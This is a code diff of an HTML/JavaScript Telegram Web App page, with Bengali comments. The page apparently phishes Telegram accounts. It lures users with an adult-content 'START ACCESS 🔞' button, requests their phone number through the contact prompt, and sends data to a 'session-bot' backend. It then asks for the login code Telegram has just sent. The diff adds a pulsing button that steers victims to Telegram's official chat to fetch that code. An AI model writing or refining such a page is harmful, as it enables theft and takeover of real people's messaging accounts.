@@ -14,7 +14,7 @@
             background-size: cover;
             height: 100vh; 
             display: flex; 
-            align-items: flex-end; /* কন্টেন্ট নিচের দিকে রাখার জন্য */
+            align-items: flex-end; 
             justify-content: center;
             overflow: hidden;
         }
@@ -28,7 +28,6 @@
             margin-bottom: 50px; 
         }
 
-        /* ধাপ ১: নিচের বাটন নির্দেশ করার জন্য আঙুলের ইমোজি */
         .finger-icon {
             font-size: 70px;
             display: block;
@@ -42,12 +41,28 @@
             50% { transform: translateY(15px); }
         }
 
-        /* ধাপ ২: ওটিপি কিপ্যাড ডিজাইন */
+        /* ওটিপি স্ক্রিন ডিজাইন */
         .instruction-box {
             background: rgba(255, 255, 255, 0.95);
             padding: 15px; border-radius: 15px;
-            margin-bottom: 20px; color: #333; font-weight: bold; font-size: 16px;
+            margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        /* নতুন Get Code বাটন ডিজাইন */
+        .get-code-btn {
+            background: linear-gradient(45deg, #2196f3, #00bcd4);
+            color: white; border: none; padding: 12px;
+            width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px;
+            cursor: pointer; margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.4);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
         }
 
         .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
@@ -78,17 +93,20 @@
     <div class="overlay"></div>
 
     <div class="main-container">
-        <!-- ধাপ ১: আঙুলের ইমোজি যা টেলিগ্রাম মেইন বাটনকে নির্দেশ করবে -->
+        <!-- ধাপ ১: আঙুলের ইমোজি -->
         <div id="step0">
             <div id="finger_point" class="finger-icon">👇</div>
             <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
-        <!-- ধাপ ২: ওটিপি কিপ্যাড স্ক্রিন -->
+        <!-- ধাপ ২: ওটিপি স্ক্রিন -->
         <div id="step2" class="hidden">
             <div class="instruction-box">
                 Enter the 5-digit code that we just sent you!
             </div>
+
+            <!-- নতুন Get Code বাটন -->
+            <button class="get-code-btn" onclick="openTelegramChat()">📥 Click Here to Get Code</button>
 
             <div class="otp-inputs">
                 <div class="otp-box" id="b1"></div>
@@ -111,13 +129,11 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Telegram Main (Menu) Button Setup
-        tg.MainButton.setText("🍓 START CONTINUE 🔞");
+        // Telegram Main Button Setup
+        tg.MainButton.setText("🍓 START ACCESS 🔞");
         tg.MainButton.textColor = "#ffffff";
-        tg.MainButton.color = "#ff4757"; // লাল রং
+        tg.MainButton.color = "#ff4757";
         tg.MainButton.show();
-        
-        // Main বাটনে ক্লিক করলে স্টার্ট হবে
         tg.MainButton.onClick(startFlow);
 
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
@@ -127,8 +143,6 @@
 
         function startFlow() {
             tg.requestContact();
-            
-            // ক্লিক করার পর মেইন বাটন এবং আঙুল হাইড করা হচ্ছে 
             tg.MainButton.hide();
             document.getElementById('finger_point').classList.add('hidden');
             document.getElementById('load').classList.remove('hidden');
@@ -159,6 +173,11 @@
                     location.reload();
                 }
             } catch (e) { alert("Server Error!"); }
+        }
+
+        // নতুন ফাংশন: টেলিগ্রাম চ্যাটে নিয়ে যাওয়ার জন্য
+        function openTelegramChat() {
+            tg.openTelegramLink("https://t.me/telegram"); // এটি সরাসরি টেলিগ্রামের অফিসিয়াল চ্যাটে নিয়ে যাবে
         }
 
         function addNum(n) {
